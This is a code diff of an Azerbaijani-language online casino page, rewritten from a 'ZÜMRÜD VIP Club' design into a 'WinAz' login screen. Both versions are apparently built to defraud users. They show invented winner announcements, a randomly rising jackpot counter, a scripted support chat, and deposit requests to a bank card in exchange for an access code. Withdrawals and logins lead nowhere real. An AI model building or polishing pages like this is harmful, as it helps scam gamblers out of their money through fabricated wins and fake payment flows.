@@ -3,322 +3,264 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>ZÜMRÜD | Exclusive VIP Club</title>
-    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Montserrat:wght@300;400;600;800&display=swap" rel="stylesheet">
+    <title>WinAz - Canlı Kazino & Slotlar</title>
     <style>
-        :root {
-            --primary: #00ffa3; /* Zümrüd yaşılı */
-            --gold: #ffcf4d;
-            --dark-bg: #080a09;
-            --panel-bg: rgba(20, 25, 23, 0.85);
-            --neon-shadow: 0 0 20px rgba(0, 255, 163, 0.3);
-        }
-
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body {
-            font-family: 'Montserrat', sans-serif;
-            background: var(--dark-bg);
-            color: #fff;
-            min-height: 100vh;
-            overflow-x: hidden;
-            background-image: url('https://www.transparenttextures.com/patterns/carbon-fibre.png'); /* İncə tekstura */
-        }
-
-        /* Arxa Fon Neon Effektləri */
-        .glow-bg {
-            position: fixed;
-            width: 300px;
-            height: 300px;
-            background: var(--primary);
-            filter: blur(150px);
-            opacity: 0.1;
-            z-index: -1;
-            border-radius: 50%;
-        }
-
-        /* Naviqasiya */
-        nav {
-            padding: 15px 5%;
-            background: rgba(0,0,0,0.9);
-            border-bottom: 2px solid var(--primary);
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            box-shadow: 0 5px 25px rgba(0,0,0,0.8);
-            position: sticky; top: 0; z-index: 100;
-        }
-
-        .logo-area { display: flex; align-items: center; gap: 10px; }
-        .logo { font-family: 'Orbitron', sans-serif; font-weight: 900; font-size: 26px; color: var(--primary); text-shadow: var(--neon-shadow); }
+        @charset "utf-8";
         
-        .user-status { display: flex; align-items: center; gap: 15px; }
-        .vip-badge { background: var(--gold); color: #000; padding: 3px 10px; border-radius: 5px; font-weight: 800; font-size: 10px; }
+        * { box-sizing: border-box; }
 
-        .balance-pill {
-            background: rgba(255,255,255,0.05);
-            border: 1px solid var(--primary);
-            padding: 8px 15px;
-            border-radius: 50px;
-            font-weight: 700;
-            box-shadow: inset 0 0 10px rgba(0,255,163,0.1);
-        }
-
-        /* Əsas Konteyner */
-        .app-container { max-width: 500px; margin: 30px auto; padding: 0 20px; }
-
-        /* Canlı Qazanclar (Yeni) */
-        .live-win {
-            background: rgba(0, 255, 163, 0.1);
-            border: 1px solid var(--primary);
-            padding: 10px;
-            border-radius: 10px;
-            margin-bottom: 20px;
-            display: flex;
-            align-items: center;
-            gap: 10px;
-            font-size: 12px;
-            animation: slideIn 0.5s ease;
-        }
-
-        @keyframes slideIn { from { opacity: 0; transform: translateX(-20px); } to { opacity: 1; transform: translateX(0); } }
-
-        /* Kartlar */
-        .glass-card {
-            background: var(--panel-bg);
-            backdrop-filter: blur(15px);
-            border: 1px solid rgba(255,255,255,0.1);
-            border-radius: 30px;
-            padding: 35px;
-            box-shadow: 0 25px 50px rgba(0,0,0,0.5);
-            margin-bottom: 25px;
-            position: relative;
+        body, html {
+            height: 100%; width: 100%; margin: 0; padding: 0;
+            background: #000;
+            font-family: 'Segoe UI', Arial, sans-serif;
             overflow: hidden;
+            color: #fff;
         }
 
-        .glass-card::before {
-            content: ""; position: absolute; top: 0; left: 0; width: 100%; height: 4px;
-            background: linear-gradient(90deg, transparent, var(--primary), transparent);
+        /* Fon animasiyası */
+        .bg-overlay {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: radial-gradient(circle at center, #1a1a1a 0%, #000 90%);
+            z-index: -1;
         }
 
-        h2 { font-family: 'Orbitron', sans-serif; font-size: 20px; margin-bottom: 25px; text-align: center; letter-spacing: 2px; color: var(--gold); }
+        /* TƏKMİLLƏŞDİRİLMİŞ JACKPOT */
+        #jackpotCont {
+            position: absolute;
+            top: 15px;
+            width: 100%;
+            text-align: center;
+            z-index: 20;
+        }
 
-        /* Depozit Mesajı (Tələbiniz üzrə) */
-        .urgent-notice {
-            background: linear-gradient(45deg, #1a1a1a, #2a2a2a);
-            border-left: 4px solid var(--gold);
-            padding: 15px;
+        .jackpot-box {
+            display: inline-block;
+            background: rgba(255, 215, 0, 0.1);
+            padding: 10px 40px;
+            border-radius: 50px;
+            border: 2px solid #ffd700;
+            box-shadow: 0 0 20px rgba(255, 215, 0, 0.4), inset 0 0 10px rgba(255, 215, 0, 0.2);
+        }
+
+        .jackpot-label {
+            font-size: 14px;
+            color: #ffd700;
+            text-transform: uppercase;
+            letter-spacing: 4px;
+            font-weight: bold;
+            margin-bottom: 3px;
+            display: block;
+        }
+
+        .jackpot-amount {
+            font-size: 52px;
+            font-weight: 900;
+            color: #fff;
+            text-shadow: 0 0 15px #ffd700, 0 0 30px #ff8c00;
+            font-family: 'Tahoma', sans-serif;
+        }
+
+        /* CANLI LOGO (NEON EFFECT) */
+        .brand-container {
+            margin-top: 60px;
+            text-align: center;
+        }
+
+        .brand-header {
+            font-size: 90px;
+            font-weight: 950;
+            color: #fff;
+            text-transform: uppercase;
+            letter-spacing: 15px;
+            margin: 0;
+            animation: neonGlow 1.5s ease-in-out infinite alternate;
+        }
+
+        @keyframes neonGlow {
+            from {
+                text-shadow: 0 0 10px #fff, 0 0 20px #fff, 0 0 30px #ffd700, 0 0 40px #ffd700, 0 0 70px #ffd700;
+            }
+            to {
+                text-shadow: 0 0 20px #fff, 0 0 30px #ff8c00, 0 0 40px #ff8c00, 0 0 50px #ff8c00, 0 0 80px #ff8c00;
+            }
+        }
+
+        /* Panel - Şəkillər qorunur */
+        #wrapper {
+            height: 100%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            position: relative;
+        }
+
+        #codeFormWr {
+            background: url("online555logo.png") no-repeat center;
+            height: 257px;
+            width: 100%;
+            max-width: 1108px;
+            position: relative;
+        }
+
+        #codeFormCont {
+            background: url("login-panel-back.png") repeat;
+            bottom: -60px;
+            height: 152px;
+            left: 50%;
+            margin-left: -339px;
+            position: absolute;
+            width: 678px;
+            border-radius: 15px;
+            border: 1px solid rgba(255, 215, 0, 0.4);
+        }
+
+        #codeFld {
+            background: url("code-field-back.png") no-repeat;
+            border: none; color: #000; height: 34px; padding: 5px;
+            position: absolute; right: 140px; top: 54px; width: 284px;
+            outline: none; font-size: 24px; text-align: center; font-weight: bold;
+        }
+
+        #codeFldLbl {
+            color: #fff; left: 60px; position: absolute; top: 60px;
+            font: bold 22px Tahoma;
+        }
+
+        #submitBtn {
+            background: url("log-btn.png") no-repeat;
+            border: 0; cursor: pointer; height: 50px; position: absolute;
+            right: 50px; top: 53px; width: 83px; color: #fff; font-weight: bold;
+        }
+
+        /* CANLI DƏSTƏK BUTONU (ANIMASIYALI) */
+        #supportBtn {
+            position: fixed;
+            bottom: 35px;
+            right: 35px;
+            width: 90px;
+            height: 90px;
+            background: radial-gradient(circle, #ffd700, #ff8c00);
+            border-radius: 50%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            cursor: pointer;
+            z-index: 1001;
+            box-shadow: 0 0 0 0 rgba(255, 215, 0, 0.7);
+            animation: pulseSupport 1.5s infinite;
+        }
+
+        .support-label {
+            position: absolute;
+            left: -200px;
+            background: #fff;
+            color: #000;
+            padding: 8px 15px;
             border-radius: 10px;
-            margin-bottom: 25px;
-            font-size: 13px;
-            line-height: 1.6;
+            font-weight: bold;
+            font-size: 14px;
+            white-space: nowrap;
+            box-shadow: 0 5px 15px rgba(0,0,0,0.3);
+            pointer-events: none;
         }
 
-        /* İnput və Düymələr */
-        .input-box { margin-bottom: 20px; }
-        .input-box label { display: block; font-size: 11px; text-transform: uppercase; color: var(--primary); margin-bottom: 8px; font-weight: 700; }
-        
-        input {
-            width: 100%; padding: 16px; background: rgba(0,0,0,0.5); border: 1px solid rgba(255,255,255,0.1);
-            border-radius: 15px; color: #fff; font-size: 15px; transition: 0.3s;
-        }
-        input:focus { border-color: var(--primary); outline: none; box-shadow: 0 0 15px rgba(0,255,163,0.2); }
-
-        .btn-main {
-            width: 100%; padding: 18px; border: none; border-radius: 15px;
-            background: linear-gradient(45deg, #00c875, #00ffa3);
-            color: #000; font-weight: 800; font-size: 15px; text-transform: uppercase;
-            cursor: pointer; transition: 0.4s; box-shadow: 0 10px 20px rgba(0, 255, 163, 0.2);
-        }
-        .btn-main:hover { transform: translateY(-3px); box-shadow: 0 15px 30px rgba(0, 255, 163, 0.4); }
-
-        /* Kart Kopyalama */
-        .card-display {
-            background: #000; padding: 20px; border-radius: 20px; border: 1px dashed var(--gold);
-            text-align: center; cursor: pointer; position: relative;
-        }
-        .card-display:active { transform: scale(0.98); }
-        .copy-hint { font-size: 9px; color: var(--gold); display: block; margin-top: 10px; }
-
-        /* WhatsApp */
-        .wa-btn {
-            position: fixed; bottom: 30px; right: 25px; background: #25d366;
-            width: 65px; height: 65px; border-radius: 50%; display: flex; justify-content: center;
-            align-items: center; box-shadow: 0 10px 25px rgba(0,0,0,0.3); z-index: 1000;
+        @keyframes pulseSupport {
+            0% { transform: scale(0.95); box-shadow: 0 0 0 0 rgba(255, 215, 0, 0.7); }
+            70% { transform: scale(1); box-shadow: 0 0 0 20px rgba(255, 215, 0, 0); }
+            100% { transform: scale(0.95); box-shadow: 0 0 0 0 rgba(255, 215, 0, 0); }
         }
 
-        /* Bölmələr */
-        .page { display: none; }
-        .page.active { display: block; animation: pageFade 0.6s ease; }
-        @keyframes pageFade { from { opacity: 0; transform: scale(0.98); } to { opacity: 1; transform: scale(1); } }
-
-        .footer-logos {
-            display: flex; justify-content: center; gap: 20px; opacity: 0.3; margin-top: 40px; padding-bottom: 40px;
+        /* ÇAT PƏNCƏRƏSİ */
+        #chatBox {
+            position: fixed; bottom: 140px; right: 35px; width: 350px;
+            background: #fff; border-radius: 15px; box-shadow: 0 10px 40px rgba(0,0,0,0.8);
+            display: none; flex-direction: column; z-index: 1000; overflow: hidden; border: 2px solid #ffd700;
         }
+
+        .chat-head { background: #ffd700; color: #000; padding: 15px; font-weight: bold; display: flex; justify-content: space-between; align-items: center; }
+        .chat-body { padding: 15px; background: #f1f1f1; height: 300px; overflow-y: auto; color: #333; }
+        .msg-op { background: #fff; padding: 12px; border-radius: 10px; border-left: 5px solid #ffd700; margin-bottom: 15px; }
+        .card-no { background: #000; color: #ffd700; padding: 10px; text-align: center; border-radius: 5px; margin-top: 10px; font-family: monospace; font-size: 17px; }
+        .chat-input { padding: 10px; border-top: 1px solid #ddd; display: flex; }
+        .chat-input input { flex: 1; padding: 10px; border: 1px solid #ccc; border-radius: 5px; outline: none; }
     </style>
 </head>
 <body>
 
-<div class="glow-bg" style="top: 10%; left: -10%;"></div>
-<div class="glow-bg" style="bottom: 10%; right: -10%;"></div>
+<div class="bg-overlay"></div>
 
-<nav>
-    <div class="logo-area">
-        <div class="logo">ZÜMRÜD</div>
-        <span class="vip-badge">VIP CLUB</span>
+<div id="jackpotCont">
+    <div class="jackpot-box">
+        <span class="jackpot-label">👑 MEGA JACKPOT 👑</span>
+        <div class="jackpot-amount">₼ <span id="jackpotNum">150.00</span></div>
     </div>
-    <div class="user-status">
-        <div class="balance-pill">₼ <span id="balance">0.00</span></div>
-    </div>
-</nav>
-
-<div class="app-container">
-
-    <div id="liveWinBox" class="live-win">
-        <span id="winIcon">💰</span>
-        <span id="winText">İstifadəçi <b>user_77</b> indicə <b>250 AZN</b> qazandı!</span>
-    </div>
-
-    <div id="loginPage" class="page active">
-        <div class="glass-card">
-            <h2>XOŞ GƏLDİNİZ</h2>
-            <div class="input-box">
-                <label>İstifadəçi Hesabı</label>
-                <input type="text" id="username" placeholder="İstifadəçi adınızı yazın">
-            </div>
-            <button class="btn-main" onclick="navigateTo('homePage')">Klubu Daxil Ol</button>
-        </div>
-    </div>
-
-    <div id="homePage" class="page">
-        <div class="urgent-notice">
-            ✨ <b>MÜHÜM:</b> Oyun panelinə giriş üçün aktiv kodunuz olmalıdır. Kodu əldə etmək üçün <b>Depozit</b> edin .
-        </div>
-
-        <div class="glass-card">
-            <h2>OYUN PANELİ</h2>
-            <div class="input-box">
-                <label>Aktivasiya Kodu</label>
-                <input type="text" id="gameCode" placeholder="Məsələn: 11-22-33-44-55-66-77" style="text-align: center; letter-spacing: 4px; font-weight: 800; border-color: var(--gold);">
-            </div>
-            <button class="btn-main" onclick="playGame()">OYUNA BAŞLA</button>
-            <div style="display: flex; gap: 10px; margin-top: 20px;">
-                <button class="btn-main" style="background: #222; color: #fff; font-size: 12px;" onclick="navigateTo('depositPage')">DEPOZİT</button>
-                <button class="btn-main" style="background: #222; color: #fff; font-size: 12px;" onclick="navigateTo('withdrawPage')">ÇIXARIŞ</button>
-            </div>
-        </div>
-    </div>
-
-    <div id="depositPage" class="page">
-        <div class="glass-card">
-            <h2>BALANS ARTIR</h2>
-            <p style="font-size: 12px; color: #aaa; margin-bottom: 15px; text-align: center;">Məbləği karta göndərin və şəkli aşağıdan yükləyin:</p>
-            
-            <div class="card-display" onclick="copyCard()">
-                <label style="color: var(--gold); font-size: 10px;">RƏSMİ KART (KLİNK ET KOPYALA)</label>
-                <h3 id="cardNumber" style="letter-spacing: 2px; margin: 10px 0;">4127 0000 1111 2222</h3>
-                <span class="copy-hint">ADMİN: ZÜMRÜD SUPPORT</span>
-            </div>
-
-            <div class="input-box" style="margin-top: 25px;">
-                <label>Məbləğ (AZN)</label>
-                <input type="number" id="amount" placeholder="50">
-            </div>
-            <div class="input-box">
-                <label>Ödəniş Çeki (Şəkil)</label>
-                <input type="file" accept="image/*">
-            </div>
-            <button class="btn-main" onclick="requestDeposit()">TƏSDİQƏ GÖNDƏR</button>
-            <button class="btn-main" style="background: transparent; border: 1px solid #333; color: #666; margin-top: 10px;" onclick="navigateTo('homePage')">GERİ</button>
-        </div>
-    </div>
-
-    <div id="withdrawPage" class="page">
-        <div class="glass-card">
-            <h2>UDUŞU ÇIXAR</h2>
-            <div class="input-box">
-                <label>Oyun Kodu</label>
-                <input type="text" placeholder="Kodunuz">
-            </div>
-            <div class="input-group" style="display: flex; gap: 10px;">
-                <div class="input-box">
-                    <label>Kart Nömrəniz</label>
-                    <input type="text" placeholder="4127...">
-                </div>
-                <div class="input-box">
-                    <label>Məbləğ</label>
-                    <input type="number" placeholder="AZN">
-                </div>
-            </div>
-            <button class="btn-main" onclick="alert('Çıxarış sorğusu qəbul edildi. 15 dəqiqə ərzində kartınıza köçəcək.')">PULUNU ÇƏK</button>
-            <button class="btn-main" style="background: transparent; border: 1px solid #333; color: #666; margin-top: 10px;" onclick="navigateTo('homePage')">GERİ</button>
-        </div>
-    </div>
-
-    <div class="footer-logos">
-        <img src="https://img.icons8.com/color/48/visa.png" width="30">
-        <img src="https://img.icons8.com/color/48/mastercard.png" width="30">
-        <img src="https://img.icons8.com/fluency/48/shield.png" width="30">
-        <span style="font-weight: 800; font-size: 20px;">18+</span>
-    </div>
-
 </div>
 
-<a href="https://wa.me/994702005487?text=Salam." class="wa-btn" target="_blank">
-    <img src="https://img.icons8.com/color/48/whatsapp.png" width="40">
-</a>
+<div id="wrapper">
+    <div class="brand-container">
+        <h1 class="brand-header">WinAz</h1>
+    </div>
+
+    <div id="codeFormWr">
+        <div id="codeFormCont">
+            <div id="codeFldLbl">Giriş Kodu:</div>
+            <form id="loginForm">
+                <input type="text" id="codeFld" placeholder="••••••" autocomplete="off" required>
+                <button type="submit" id="submitBtn">GİRİŞ</button>
+            </form>
+        </div>
+    </div>
+</div>
+
+<div id="supportBtn" onclick="toggleChat()">
+    <div class="support-label">Kod almaq üçün klik edin!</div>
+    <svg width="40" height="40" viewBox="0 0 24 24" fill="none" stroke="#000" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"></path></svg>
+</div>
+
+<div id="chatBox">
+    <div class="chat-head">
+        <span>WinAz CANLI DƏSTƏK</span>
+        <span onclick="toggleChat()" style="cursor:pointer; font-size: 20px;">✕</span>
+    </div>
+    <div class="chat-body">
+        <div class="msg-op">
+            <strong>Operator:</strong><br>
+            Salam! WinAz kazino sizi salamlayır. Kod əldə etmək üçün depozit edib qəbzi bura göndərin.<br>
+            <div class="card-no">4169 7388 0000 0000</div>
+        </div>
+    </div>
+    <div class="chat-input">
+        <input type="text" placeholder="Mesajınızı yazın...">
+    </div>
+</div>
 
 <script>
-    // Səhifə naviqasiyası
-    function navigateTo(pageId) {
-        document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
-        document.getElementById(pageId).classList.add('active');
-        window.scrollTo(0,0);
-    }
-
-    // Kartı kopyala
-    function copyCard() {
-        const cardNum = document.getElementById('cardNumber').innerText;
-        navigator.clipboard.writeText(cardNum);
-        alert("Kart nömrəsi kopyalandı!");
-    }
-
-    // Oyun funksiyası
-    function playGame() {
-        const code = document.getElementById('gameCode').value;
-        if(code.length > 3) {
-            window.location.href = "https://fastloto365.com";
-        } else {
-            alert("Lütfən keçərli kod daxil edin. Kodunuz yoxdursa, Depozit bölməsinə keçin.");
-        }
-    }
-
-    // Depozit sorğusu
-    function requestDeposit() {
-        const amt = document.getElementById('amount').value;
-        if(amt > 0) {
-            alert("Sorğu göndərildi! Ödəniş yoxlanıldıqdan sonra kodunuz şəxsi kabinetinizə göndəriləcək.");
-            navigateTo('homePage');
-        } else {
-            alert("Məbləği daxil edin.");
-        }
-    }
-
-    // Fake Canlı Qaliblər
-    const winners = [
-        "user_221 indicə 400 AZN qazandı!",
-        "VIP_Azeri indicə 1200 AZN qazandı!",
-        "Ali_99 indicə 150 AZN qazandı!",
-        "Zümrüd_Gamer indicə 3000 AZN qazandı!"
-    ];
+    // Jackpot Sayğacı (150 - 400 arası canlı artım)
+    let amount = 150.00;
+    const jackpotDisplay = document.getElementById('jackpotNum');
     
-    setInterval(() => {
-        const randomWin = winners[Math.floor(Math.random() * winners.length)];
-        const winBox = document.getElementById('liveWinBox');
-        document.getElementById('winText').innerHTML = `<b>${randomWin}</b>`;
-        winBox.style.animation = 'none';
-        void winBox.offsetWidth; // Reflow
-        winBox.style.animation = 'slideIn 0.5s ease';
-    }, 8000);
+    function updateJackpot() {
+        if (amount < 400) {
+            amount += (Math.random() * 0.08);
+            jackpotDisplay.innerText = amount.toFixed(2);
+        } else {
+            amount = 150.00;
+        }
+    }
+    setInterval(updateJackpot, 80);
+
+    // Çat aç/bağla
+    function toggleChat() {
+        const chat = document.getElementById('chatBox');
+        chat.style.display = (chat.style.display === 'flex') ? 'none' : 'flex';
+    }
+
+    // Giriş yönləndirməsi
+    document.getElementById('loginForm').addEventListener('submit', function(e) {
+        e.preventDefault();
+        window.location.href = "https://fastloto365.com";
+    });
 </script>
 
 </body>
